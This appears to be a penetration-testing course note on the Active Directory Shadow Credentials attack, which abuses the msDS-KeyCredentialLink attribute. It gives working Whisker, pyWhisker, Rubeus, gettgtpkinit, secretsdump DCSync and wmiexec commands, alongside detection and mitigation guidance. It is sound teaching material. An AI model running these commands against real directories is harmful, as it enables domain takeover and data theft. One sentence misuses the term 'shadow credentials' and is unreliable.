---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.11 Shadow Credentials - MSDS-KeyCredentialLink"
---

# 11 - Shadow Credentials - MSDS-KeyCredentialLink

## Introduction and Theoretical Underpinnings

The "Shadow Credentials" attack represents a sophisticated technique within the Active Directory ecosystem, heavily leveraging the Public Key Cryptography for Initial Authentication (PKINIT) protocol. Discovered and popularized by Elad Shamir, this attack allows an adversary who possesses specific write privileges over a target computer or user object to completely compromise that object without needing to reset its password or modify its Service Principal Names (SPNs).

Unlike traditional attacks like Resource-Based Constrained Delegation (RBCD), which require modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, or traditional shadow credentials (where one simply changes the password), this technique alters the `msDS-KeyCredentialLink` attribute.

### The Role of `msDS-KeyCredentialLink`

Introduced to support Windows Hello for Business (WHfB), the `msDS-KeyCredentialLink` attribute allows users and devices to authenticate to Active Directory using cryptographic keys (specifically, asymmetric key pairs) instead of traditional passwords. When a WHfB enrollment occurs, the public key is stored in this attribute on the respective user or computer object. 

During authentication, the entity requests a Ticket Granting Ticket (TGT) using the PKINIT protocol, signing the request with its private key. The Key Distribution Center (KDC) validates this signature against the public key stored in the `msDS-KeyCredentialLink` attribute. If valid, the KDC issues the TGT.

An attacker with the ability to write to this attribute (e.g., via `GenericWrite`, `GenericAll`, `WriteProperty` over the attribute) can inject their own public key. Subsequently, they can use the corresponding private key to authenticate as the compromised principal and request a TGT on its behalf.

## Deep Dive into the Attribute Structure

The `msDS-KeyCredentialLink` attribute is a multi-valued attribute containing a complex binary structure known as `DNWithBinary`. This structure consists of multiple `KEYCREDENTIAL_ENTRY` structures.

A typical entry contains:
- **KeyHash**: A SHA-256 hash of the public key.
- **KeyMaterial**: The actual RSA public key.
- **KeyUsage**: Typically set to 0x01 (Key Agreement) or 0x02 (Signature).
- **KeySource**: Indicates where the key came from (e.g., AD, Azure AD).
- **DeviceId**: A unique identifier for the device that generated the key.

By parsing and constructing this undocumented binary blob (which tools like Whisker do automatically), attackers can append new keys without destroying legitimate keys already present.

## ASCII Architecture: The Attack Flow

```text
+-------------------+                                  +-----------------------+
|                   |  1. Has GenericWrite on Target   |                       |
|   Attacker Node   | -------------------------------> |   Target AD Object    |
|                   |                                  |   (e.g., DESKTOP-X)   |
+-------------------+                                  +-----------------------+
        |                                                        |
        | 2. Generate RSA Keypair                                |
        |                                                        |
        | 3. Inject Public Key into msDS-KeyCredentialLink       |
        +--------------------------------------------------------+
        |
        | 4. AS-REQ (PKINIT) signed with Private Key
        v
+-------------------+
|                   |
| Domain Controller |
|      (KDC)        |
|                   |
+-------------------+
        |
        | 5. Validate signature against msDS-KeyCredentialLink
        | 6. Issue AS-REP containing TGT for Target Object
        v
+-------------------+
|                   |
|   Attacker Node   |  7. Pass-the-Ticket to DCSync, WMI, SMB, etc.
| (Holds target TGT)|
|                   |
+-------------------+
```

## Prerequisites for the Attack

1. **Privileges**: The attacker must possess adequate permissions over the target object. Specifically, the attacker needs one of the following:
   - `GenericAll`
   - `GenericWrite`
   - `WriteProperty` specifically for the `msDS-KeyCredentialLink` attribute.
2. **PKINIT Configuration**: The Domain Controller must be configured to support PKINIT. This usually means the DC has a suitable certificate installed (e.g., Domain Controller Authentication certificate). In modern AD environments, especially those integrated with Azure AD or using Windows Hello for Business, this is true by default.
3. **Target Type**: The target can be a User object or a Computer object. Modifying a Computer object's credentials often leads to domain escalation if the computer is a Domain Controller.

## Step-by-Step Execution

### Step 1: Enumeration and Discovery

The first step involves identifying objects over which the compromised user has the necessary write privileges. This is almost exclusively performed using BloodHound or PowerView.

**Using PowerView:**
```powershell
# Find objects where our current user has GenericWrite or GenericAll
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    ($_.IdentityReferenceName -eq "CompromisedUser") -and 
    ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll")
}
```

**Using BloodHound:**
In the BloodHound GUI, you can use built-in queries like "Find Principals with DCSync Rights" or custom Cypher queries to map out `GenericWrite` and `GenericAll` relationships:
```cypher
MATCH (u:User {name:"COMPROMISEDUSER@DOMAIN.LOCAL"})-[r:GenericWrite|GenericAll]->(c:Computer)
RETURN u,r,c
```

### Step 2: Injecting the Shadow Credential

Once a target is identified (e.g., `VICTIM-PC$`), we use specialized tooling to generate a keypair and inject the public key into the target's `msDS-KeyCredentialLink` attribute.

**Using Whisker (C#/.NET):**
Whisker is a C# tool designed for this exact purpose. It operates seamlessly in memory via Cobalt Strike's `execute-assembly`.

```powershell
# Add a new shadow credential to the target computer
Whisker.exe add /target:VICTIM-PC$ /domain:domain.local /dc:dc01.domain.local
```
Whisker will output the necessary Rubeus command to request the TGT using the generated certificate.

**Using pyWhisker (Python / Linux):**
From a Linux attacking machine, `pyWhisker` allows integration with the Impacket suite.

```bash
# Add a key credential
pywhisker.py -d domain.local -u CompromisedUser -p 'Password123!' -t VICTIM-PC$ --action add
```
This command generates an RSA key pair, creates the appropriate certificate structure, updates the AD attribute, and saves the certificate locally (often as a `.pfx` file).

### Step 3: Requesting the TGT

With the shadow credential injected, the attacker now requests a TGT as the target object using PKINIT.

**Using Rubeus (Windows):**
```powershell
# The exact command is usually provided by Whisker
Rubeus.exe asktgt /user:VICTIM-PC$ /certificate:base64_encoded_cert_from_whisker /password:"password_from_whisker" /domain:domain.local /dc:dc01.domain.local /ptt
```
This requests the TGT and injects it directly into the current logon session (`/ptt`).

**Using Certipy or gettgtpkinit.py (Linux):**
```bash
# Request the TGT using gettgtpkinit.py from PKINITtools
gettgtpkinit.py domain.local/VICTIM-PC\$ -cert-pfx victim-pc.pfx -pfx-pass password out.ccache

# Set the KRB5CCNAME environment variable
export KRB5CCNAME=/path/to/out.ccache
```

### Step 4: Exploitation and Lateral Movement

With the TGT of the target object in hand, the attacker can act as that object. 

If the target was a standard user, the attacker can access any resources that user has access to.
If the target was a computer (e.g., `VICTIM-PC$`), the attacker can compromise that host using tools like `smbexec.py` or `wmiexec.py` because the computer account has local administrator rights over itself.

If the target was a Domain Controller (`DC01$`), the attacker can immediately perform a DCSync attack to dump the entire Active Directory database:

```bash
# DCSync using the DC's own computer account
secretsdump.py -k -no-pass DC01\$@dc01.domain.local
```

### Step 5: Cleanup

It is highly critical to remove the shadow credential after use to avoid leaving backdoors and triggering long-term detections.

**Using Whisker:**
```powershell
Whisker.exe remove /target:VICTIM-PC$ /deviceid:<Device_ID_from_add_step>
```

**Using pyWhisker:**
```bash
pywhisker.py -d domain.local -u CompromisedUser -p 'Password123!' -t VICTIM-PC$ --action remove --device-id <Device_ID>
```

## Detection and Mitigation Strategies

### Mitigation

1. **Strict ACL Management**: The fundamental root cause is excessive privileges (GenericWrite/GenericAll) granted to non-administrative users over critical objects. Regularly audit Active Directory ACLs using BloodHound or built-in PowerShell scripts. Remove unnecessary write privileges.
2. **Tiered Administration**: Ensure that accounts in lower tiers (e.g., Tier 2 - Workstations) do not possess write capabilities over Tier 1 (Servers) or Tier 0 (Domain Controllers) objects.
3. **Protected Users Group**: Adding sensitive users to the Protected Users group provides defense-in-depth, although it does not prevent the `msDS-KeyCredentialLink` attribute from being modified if the permissions allow it.
4. **Disable PKINIT if Unnecessary**: If Windows Hello for Business or smart card authentication is not utilized in the environment, disabling PKINIT on the Domain Controllers can prevent this attack vector entirely. However, this is often not feasible in modern environments.

### Detection

1. **Event ID 5136 (Directory Service Changes)**: This is the most reliable detection method. Monitor for modifications to the `msDS-KeyCredentialLink` attribute.
   - Look for `Event ID 5136` where the `Attribute name` is `msDS-KeyCredentialLink` and the `Operation Type` is `Value Added`.
   - Alerting on any modification to this attribute by a non-system or non-administrative account is a high-fidelity indicator of compromise.
2. **Event ID 4768 (A Kerberos authentication ticket (TGT) was requested)**:
   - When the TGT is requested via PKINIT, the event will contain specific details. Look for requests where the `Certificate Issuer Name` and `Certificate Serial Number` are populated.
   - Correlate these requests with recent modifications to the `msDS-KeyCredentialLink` attribute.
3. **Event ID 4662 (An operation was performed on an object)**:
   - Similar to 5136, but fires when the object is accessed. Can be noisy but useful for forensics.
4. **Regular Auditing**: Periodically scan the domain for objects that have the `msDS-KeyCredentialLink` attribute populated and verify that these entries correspond to legitimate WHfB enrollments.

## Deep Architectural Implications

The shadow credentials attack is a prime example of abusing legitimate, modern features meant to enhance security (WHfB, passwordless auth) to facilitate complete compromise. It underscores the importance of identity as the new security perimeter. In legacy networks, changing a user's password was loud, destructive (locking the user out), and easily noticed. Shadow credentials allow for silent, persistent, and non-destructive compromise. 

The binary structure of the attribute itself is heavily undocumented by Microsoft, requiring reverse engineering by the security community to build tools like Whisker. This obscurity initially provided a brief window where defensive tools lacked the capability to parse and alert on anomalous keys, though modern SIEM and EDR solutions have since caught up.

## Real-World Attack Scenario

During an assumed breach assessment, an attacker started with a compromised Helpdesk user account (`helpdesk_jdoe`). While mapping the Active Directory environment using BloodHound, the attacker discovered that the Helpdesk group had been mistakenly granted `GenericWrite` permissions over an essential application server, `APP-SERVER$`, likely intended for LAPS password resets but misconfigured as a blanket write privilege.

The organization had recently rolled out Windows Hello for Business, meaning the Domain Controllers were equipped with the necessary certificates to support Kerberos PKINIT. Recognizing this, the attacker decided to execute a Shadow Credentials attack to quietly compromise the server without altering its password or disrupting its services.

Using `pywhisker.py`, the attacker generated a new RSA keypair and injected the public key into the `msDS-KeyCredentialLink` attribute of `APP-SERVER$`:
```bash
pywhisker.py -d corp.local -u helpdesk_jdoe -p 'Summer2026!' -t APP-SERVER$ --action add
```

The tool successfully manipulated the raw binary structure of the attribute and saved the corresponding certificate locally as `APP-SERVER$.pfx`. Because the Active Directory PKINIT implementation inherently trusts keys listed in the `msDS-KeyCredentialLink` attribute, the attacker now possessed a valid cryptographic credential for the machine account.

The attacker then used `gettgtpkinit.py` to request a Ticket Granting Ticket (TGT) on behalf of the `APP-SERVER$` account, using the generated certificate to sign the Kerberos AS-REQ:
```bash
gettgtpkinit.py corp.local/APP-SERVER\$ -cert-pfx APP-SERVER$.pfx -pfx-pass pyWhisker out.ccache
```

With the TGT successfully issued and exported (`export KRB5CCNAME=out.ccache`), the attacker wielded the computer's own privileges. Since machine accounts are always Local Administrators on their respective hosts, the attacker executed `wmiexec.py -k -no-pass APP-SERVER$.corp.local` to gain a remote `SYSTEM` shell on the application server. They extracted the proprietary source code and subsequently removed the shadow credential using `pywhisker --action remove`, leaving no persistent backdoor and evading standard password-reset alerts.

## Chaining Opportunities

- **[[14 - Relay across Forest Trusts]]**: If an attacker can coerce authentication across a forest trust, they can potentially relay that authentication to LDAP and modify the `msDS-KeyCredentialLink` of a target object in the foreign domain, bypassing the need for explicit credentials.
- **NTLM Relaying to LDAP**: Combining PetitPotam or PrinterBug to coerce a machine account's NTLM authentication, relaying it to an LDAP server (if LDAP signing is disabled), and injecting a shadow credential into an object the coerced machine has write access to. This effectively upgrades an NTLM authentication into a Kerberos TGT.
- **WebDAV Coercion**: Coercing an authentication via WebDAV to bypass SMB signing, relaying to LDAP, and writing the shadow credential.

## Related Notes
- [[12 - Drop-the-MIC - Bypassing NTLM MIC]]
- [[13 - EPA Extended Protection Bypasses]]
- [[15 - Coercion and Relay Defense Strategies]]
- [[02 - NTLM Relay Attacks Deep Dive]]
- [[05 - Resource-Based Constrained Delegation (RBCD)]]

